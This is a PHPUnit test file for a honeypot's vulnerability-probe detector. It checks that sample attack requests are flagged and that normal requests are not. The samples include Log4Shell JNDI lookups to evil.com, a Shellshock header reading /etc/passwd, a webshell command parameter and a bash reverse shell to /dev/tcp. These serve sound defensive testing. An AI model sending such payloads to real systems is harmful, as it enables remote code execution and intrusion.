<?php

declare(strict_types=1);

namespace ReportedIp\Honeypot\Tests\Analyzers;

use ReportedIp\Honeypot\Detection\Analyzers\VulnerabilityProbeAnalyzer;
use ReportedIp\Honeypot\Tests\TestCase;

final class VulnerabilityProbeAnalyzerTest extends TestCase
{
    private VulnerabilityProbeAnalyzer $analyzer;

    public function setUp(): void
    {
        $this->analyzer = new VulnerabilityProbeAnalyzer();
    }

    public function testGetName(): void
    {
        $this->t->assertEquals('VulnerabilityProbe', $this->analyzer->getName());
    }

    // --- Positive tests ---

    public function testDetectsLog4Shell(): void
    {
        $request = $this->createRequest([
            'uri'     => '/api',
            'headers' => ['User-Agent' => '${jndi:ldap://evil.com/exploit}'],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
        $this->t->assertGreaterThanOrEqual(90, $result->getScore());
        $this->t->assertContains('Log4Shell', $result->getComment());
    }

    public function testDetectsLog4ShellInHeader(): void
    {
        $request = $this->createRequest([
            'uri'     => '/page',
            'headers' => [
                'Host'          => 'example.com',
                'X-Api-Version' => '${jndi:ldap://evil.com/a}',
            ],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    public function testDetectsEvalStdin(): void
    {
        $request = $this->createRequest([
            'uri' => '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    public function testDetectsShellshock(): void
    {
        $request = $this->createRequest([
            'uri'     => '/cgi-bin/test',
            'headers' => ['User-Agent' => '() { :; }; /bin/bash -c "cat /etc/passwd"'],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
        $this->t->assertGreaterThanOrEqual(90, $result->getScore());
    }

    public function testDetectsWebshellCommandParam(): void
    {
        $request = $this->createRequest([
            'uri'        => '/shell.php',
            'queryParams' => ['cmd' => 'id;whoami'],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
        $this->t->assertGreaterThanOrEqual(85, $result->getScore());
    }

    public function testDetectsWpRestApiUserEnum(): void
    {
        $request = $this->createRequest([
            'uri' => '/wp-json/wp/v2/users',
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    public function testDetectsSpring4Shell(): void
    {
        $request = $this->createRequest([
            'uri' => '/page?class.module.classLoader.resources.context.parent.pipeline.first.pattern=test',
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    public function testDetectsReverseShellIndicator(): void
    {
        $request = $this->createRequest([
            'uri'        => '/page',
            'queryParams' => ['exec' => '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    public function testDetectsSstiProbe(): void
    {
        $request = $this->createRequest([
            'uri'        => '/page',
            'queryParams' => ['name' => '{{7*7}}'],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    // --- Negative tests ---

    public function testIgnoresNormalRequests(): void
    {
        $request = $this->createRequest([
            'uri'     => '/about',
            'method'  => 'GET',
            'headers' => [
                'User-Agent' => 'Mozilla/5.0 Chrome/120',
                'Host'       => 'example.com',
                'Accept'     => 'text/html',
            ],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNull($result);
    }

    public function testIgnoresNormalApiCall(): void
    {
        $request = $this->createRequest([
            'uri'     => '/api/products?page=1',
            'method'  => 'GET',
            'headers' => [
                'User-Agent' => 'Mozilla/5.0 Chrome/120',
                'Host'       => 'example.com',
            ],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNull($result);
    }

    public function testCategoriesAre15And35(): void
    {
        $request = $this->createRequest([
            'uri'     => '/api',
            'headers' => ['User-Agent' => '${jndi:ldap://evil.com/a}'],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
        $categories = $result->getCategories();
        $this->t->assertTrue(in_array(15, $categories, true), 'Should include category 15');
        $this->t->assertTrue(in_array(35, $categories, true), 'Should include category 35');
    }
}
